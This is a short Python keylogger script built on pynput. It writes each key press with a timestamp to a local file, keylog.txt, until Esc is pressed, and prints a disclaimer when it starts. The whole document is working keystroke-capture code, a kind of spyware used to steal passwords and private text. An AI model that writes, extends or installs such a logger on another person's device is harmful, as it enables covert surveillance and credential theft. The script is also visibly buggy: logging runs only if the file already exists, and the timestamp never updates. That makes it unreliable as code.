from pynput.keyboard import Listener, Key
import datetime
print("DISCLAMER! THIS IS A KEYLOGGER PYTHON PROGRAM  IT WILL MONITOR YOU KEYS")
now = datetime.datetime.now()
formatted_datetime = now.strftime("%Y-%m-%d %H:%M:%S")           # current time
try:
  with open("keylog.txt", "x") as file:                          # Attempt to create a new file
    file.write("KEYLOGGER\n")
except FileExistsError:
  def write_to_file(filename, data):
     with open("keylog.txt", "a") as file:                       # Attempt to add data a existing file
        file.write(data_to_write)

  def on_press(key):
       try:
        global data_to_write 
        data_to_write = formatted_datetime+f"- {key} pressed\n"  # adding key events
        write_to_file("keylog.txt", data_to_write)
       except AttributeError:                                    #Handle special keys like space or backspace 
        data_to_write = formatted_datetime+f"- {key} pressed\n"
        write_to_file("keylog.txt", data_to_write)

  def on_release(key):
    if key == Key.esc:                                           # Stop listener
        return False

  data_to_write = ""                                             # Initialize data_to_write outside the function
  with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()